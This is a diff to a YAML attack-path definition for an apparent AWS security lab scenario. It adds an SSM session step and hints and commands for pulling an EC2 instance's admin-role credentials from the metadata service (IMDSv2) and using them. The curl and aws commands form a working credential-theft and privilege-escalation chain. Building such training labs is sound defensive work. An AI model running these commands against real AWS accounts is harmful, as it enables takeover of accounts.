@@ -1,10 +1,10 @@
 attackMap:
   nodes:
-    - id: ec2-instance
-      label: "EC2 Instance"
-      type: resource
-      subType: ec2-instance
-      arn: "arn:aws:ec2:{region}:{account_id}:instance/pl-cspm-ec2-001-instance"
+    - id: starting-principal
+      label: "Demo User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-cspm-ec2-001-demo-user"
       description: >
         You have gained access to this principal's AWS IAM credentials. These could
         have been obtained through many real-world vectors: phishing a developer and
@@ -13,9 +13,20 @@ attackMap:
         a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
 
         Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has ssm:StartSession permission on the pl-cspm-ec2-001-instance
+        EC2 instance. It has no other meaningful AWS permissions -- it cannot list IAM
+        users, read S3 buckets, or call any other privileged API.
+
+    - id: ec2-instance
+      label: "EC2 Instance"
+      type: resource
+      subType: ec2-instance
+      arn: "arn:aws:ec2:{region}:{account_id}:instance/pl-cspm-ec2-001-instance"
+      description: >
         This EC2 instance has an administrative IAM role attached via an instance profile.
         Any process running on the instance can retrieve temporary admin credentials from
         the Instance Metadata Service (IMDS) at 169.254.169.254 without authentication.
+        The SSM agent is running, making it reachable via SSM Session Manager.
 
     - id: admin-role
       label: "Admin Role"
@@ -30,22 +41,46 @@ attackMap:
         administrative control of the AWS account.
 
   edges:
+    - from: starting-principal
+      to: ec2-instance
+      label: "ssm:StartSession"
+      description: >
+        The demo user has ssm:StartSession permission on this EC2 instance. Starting
+        an SSM session drops you into an interactive shell inside the instance as
+        ssm-user, from which the IMDS is reachable at 169.254.169.254.
+      hints:
+        - "Your user has ssm:StartSession -- think about what access that grants you on the target instance."
+        - "Use ssm:DescribeInstanceInformation to confirm the SSM agent is online before attempting a session."
+        - "The aws ssm start-session command opens an interactive shell on the instance without needing SSH or open ports."
+        - "Once you have a shell on the instance, you are no longer limited by your IAM user's permissions -- you can access anything the instance itself can access."
+        - "Browse to https://pathfinding.cloud/paths/cspm-ec2-001 for technique details."
+      commands:
+        - description: "Confirm the SSM agent is online on the target instance"
+          command: "aws ssm describe-instance-information --filters 'Key=InstanceIds,Values=<INSTANCE_ID>' --query 'InstanceInformationList[0].PingStatus' --output text"
+        - description: "Start an interactive SSM session on the EC2 instance"
+          command: "aws ssm start-session --region <REGION> --target <INSTANCE_ID>"
+
     - from: ec2-instance
       to: admin-role
       label: "IMDS credential extraction"
       description: >
         Any process on the EC2 instance can retrieve temporary credentials for the
         attached administrative role by querying the Instance Metadata Service. No
-        additional permissions or authentication are required.
+        additional permissions or authentication are required -- the IMDS endpoint
+        is reachable from within the instance at the link-local address 169.254.169.254.
       hints:
-        - "EC2 instances can have IAM roles attached that grant AWS API access."
-        - "Check the instance metadata service for attached role credentials."
-        - "Query http://169.254.169.254/latest/meta-data/iam/security-credentials/ from within the instance."
+        - "EC2 instances can have IAM roles attached via instance profiles. Those credentials are available inside the instance."
+        - "The Instance Metadata Service (IMDS) at 169.254.169.254 exposes the attached role's temporary credentials to any process on the instance."
+        - "Start by discovering which IAM role is attached -- query the IMDS security-credentials endpoint."
+        - "Use IMDSv2 by first obtaining a session token with a PUT request, then including it in subsequent GET requests."
+        - "Once you have the AccessKeyId, SecretAccessKey, and Token from IMDS, export them as environment variables and verify your identity with sts:GetCallerIdentity."
         - "Browse to https://pathfinding.cloud/paths/cspm-ec2-001 for technique details."
       commands:
+        - description: "Obtain an IMDSv2 session token"
+          command: "TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)"
         - description: "Retrieve the name of the attached IAM role from IMDS"
-          command: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          command: "ROLE_NAME=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)"
         - description: "Extract temporary admin credentials from IMDS"
-          command: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/pl-cspm-ec2-001-admin-role"
+          command: "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null | jq ."
         - description: "Verify administrative access using extracted credentials"
           command: "AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> aws iam list-users"
